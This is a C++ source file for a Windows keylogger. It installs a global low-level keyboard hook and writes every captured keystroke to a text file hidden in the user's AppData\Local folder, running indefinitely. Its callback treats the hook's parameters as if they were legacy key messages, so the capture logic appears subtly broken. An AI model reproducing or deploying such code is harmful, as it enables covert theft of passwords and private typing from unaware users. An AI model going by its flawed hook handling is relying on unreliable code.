// Hook2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>
#include <Shlobj.h> 

using namespace std;

HHOOK hook;

void error(DWORD retval) {
	//Standard error wrapper
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}
LRESULT __stdcall Callback(int nCode, WPARAM wParam, LPARAM lParam) {
	char ch;
	DWORD processID = GetCurrentProcessId();

	//Get User home directory
	char tempHomePath[MAX_PATH];
	long result = SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, tempHomePath);
	string home_dir(tempHomePath);

	//Create location for keyboard text dump
	string file_loc = "";
	FILE *f;
	file_loc.append(home_dir);
	file_loc.append("\\Appdata\\Local\\");
	file_loc.append(to_string(processID));
	file_loc.append(".txt");

	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			fopen_s(&f, file_loc.c_str(), "a+");
			if (wParam == VK_RETURN)
			{
				//Enter key seen, save to file
				ch = '\n';
				fwrite(&ch, 1, 1, f);
			}
			else
			{
				//Standard ascii seen, save to file
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = char(w);
				fwrite(&ch, 1, 1, f);
			}
			//Cleanup
			fclose(f);
		}
	}
	//Continue up the Hook chain
	LRESULT RetVal = CallNextHookEx(hook, nCode, wParam, lParam);
	return  RetVal;
}

void InstallHook()
{
	//Set hook on keyboard events
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0))) {
		cout << "Failed to hook!" << endl;
	}
}
int main()
{
	/*
	Standard global hook
	*/
	InstallHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		//Wait forever
	}

	return 0;
}


